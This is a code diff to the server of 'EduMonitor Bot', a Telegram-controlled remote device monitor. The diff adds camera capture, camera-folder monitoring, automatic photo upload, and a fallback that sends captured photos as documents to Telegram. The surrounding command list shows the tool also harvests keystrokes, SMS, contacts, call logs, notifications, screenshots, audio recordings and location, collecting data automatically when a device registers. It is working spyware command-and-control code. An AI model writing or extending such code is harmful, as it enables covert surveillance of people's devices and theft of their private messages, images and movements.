@@ -220,7 +220,7 @@ function getMainMenuKeyboard(chatId) {
         ],
         [
             { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
-            { text: '⚙️ Services', callback_data: 'menu_services' }
+            { text: '📸 Camera', callback_data: 'menu_camera' }
         ],
         [
             { text: '📍 Location', callback_data: 'menu_location' },
@@ -358,7 +358,12 @@ async function setChatMenuButton(chatId) {
                 { command: 'app_opens', description: '📱 Show app opens' },
                 { command: 'realtime_on', description: '🔔 Enable real-time logs' },
                 { command: 'realtime_off', description: '🔔 Disable real-time logs' },
-                { command: 'realtime_status', description: '🔔 Check real-time status' }
+                { command: 'realtime_status', description: '🔔 Check real-time status' },
+                { command: 'photo', description: '📸 Take a photo now' },
+                { command: 'takephoto', description: '📸 Alias for photo' },
+                { command: 'camera_on', description: '📸 Start camera monitoring' },
+                { command: 'camera_off', description: '📸 Stop camera monitoring' },
+                { command: 'camera_status', description: '📸 Check camera status' }
             ]
         });
         
@@ -615,6 +620,7 @@ function queueAutoDataCommands(deviceId, chatId) {
     
     console.log(`✅ All auto-data commands queued for ${deviceId}`);
 }
+
 // ============= PHOTO UPLOAD ENDPOINT =============
 app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
     try {
@@ -685,9 +691,30 @@ async function sendTelegramPhoto(chatId, filePath, filename, caption) {
         return response.data;
     } catch (error) {
         console.error('❌ Error sending photo:', error.response?.data || error.message);
-        return null;
+        
+        // Fallback to document if photo fails
+        try {
+            console.log('📎 Falling back to document send...');
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', fs.createReadStream(filePath), { filename });
+            formData.append('caption', caption);
+            
+            const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
+                headers: {
+                    ...formData.getHeaders()
+                }
+            });
+            
+            console.log(`✅ Photo sent as document to ${chatId}`);
+            return response.data;
+        } catch (e) {
+            console.error('❌ Document fallback also failed:', e.message);
+            return null;
+        }
     }
 }
+
 // ============= WEBHOOK ENDPOINT =============
 
 app.post('/webhook', async (req, res) => {
@@ -826,6 +853,23 @@ async function handleCallbackQuery(callbackQuery) {
                 `• Last seen: ${new Date(device.lastSeen).toLocaleString()}\n\n` +
                 `All commands will now be sent to this device.`);
         }
+        
+    } else if (data === 'menu_camera') {
+        const keyboard = [
+            [
+                { text: '📸 Take Photo', callback_data: 'cmd:photo' },
+                { text: '📸 Take Photo (Alt)', callback_data: 'cmd:takephoto' }
+            ],
+            [
+                { text: '✅ Start Monitoring', callback_data: 'cmd:camera_on' },
+                { text: '❌ Stop Monitoring', callback_data: 'cmd:camera_off' }
+            ],
+            [
+                { text: '📊 Camera Status', callback_data: 'cmd:camera_status' },
+                { text: '◀️ Back', callback_data: 'help_main' }
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
         
     } else if (data === 'menu_data') {
         const keyboard = [
@@ -1063,7 +1107,7 @@ async function handleCallbackQuery(callbackQuery) {
         await editMessageKeyboard(chatId, messageId, keyboard);
         await sendTelegramMessage(chatId,
             "🤖 <b>EduMonitor Bot</b>\n\n" +
-            "Version: 3.0\n" +
+            "Version: 3.1\n" +
             "Features:\n" +
             "• Remote device monitoring\n" +
             "• Multi-device support\n" +
@@ -1079,7 +1123,8 @@ async function handleCallbackQuery(callbackQuery) {
             "• Mobile network info\n" +
             "• App open tracking\n" +
             "• Real-time logging controls\n" +
-            "• Auto-data collection on registration\n\n" +
+            "• Auto-data collection on registration\n" +
+            "• 📸 Camera capture and monitoring\n\n" +
             "Use the menu below to navigate.");
         
     } else if (data === 'close_menu') {
@@ -2217,6 +2262,14 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ Device menu shows all registered devices');
     console.log('   └─ Each device gets its own command queue');
     console.log('   └─ Device info shown in all responses');
+    console.log('\n✅ CAMERA SUPPORT ENABLED:');
+    console.log('   └─ /photo - Take a photo now');
+    console.log('   └─ /takephoto - Alias for photo');
+    console.log('   └─ /camera_on - Start monitoring camera folder');
+    console.log('   └─ /camera_off - Stop monitoring camera folder');
+    console.log('   └─ /camera_status - Check camera status');
+    console.log('   └─ Photos are compressed (640x480, 70% quality)');
+    console.log('   └─ Auto-upload of new camera photos');
     console.log('\n✅ APP_OPEN LOG HANDLING:');
     console.log('   └─ Batched every 50 entries into 1 HTML file');
     console.log('   └─ Excluded from regular log sync (20 at a time)');
@@ -2234,12 +2287,13 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ 8. 📞 Call Logs (HTML)');
     console.log('   └─ 9. 📱 Apps List (HTML)');
     console.log('   └─ 10. 📍 Location');
-    console.log('\n✅ COMPLETE COMMAND LIST (50+ commands):');
+    console.log('\n✅ COMPLETE COMMAND LIST (55+ commands):');
     console.log('   └─ Devices: /devices, /select');
     console.log('   └─ Data: contacts, sms, calllogs, apps, keystrokes, notifications');
     console.log('   └─ Network: ip_info, wifi_info, mobile_info, network, all_info');
     console.log('   └─ Phone: phone_number, sim_info');
     console.log('   └─ Screenshot: screenshot, start_screenshot, stop_screenshot, small, medium, original, size_status, screenshot_settings, compression_stats, target_apps, add_target');
+    console.log('   └─ Camera: photo, takephoto, camera_on, camera_off, camera_status');
     console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high');
     console.log('   └─ Location: location, storage, battery, info, time, status');
     console.log('   └─ App: app_opens, app_opens_html');
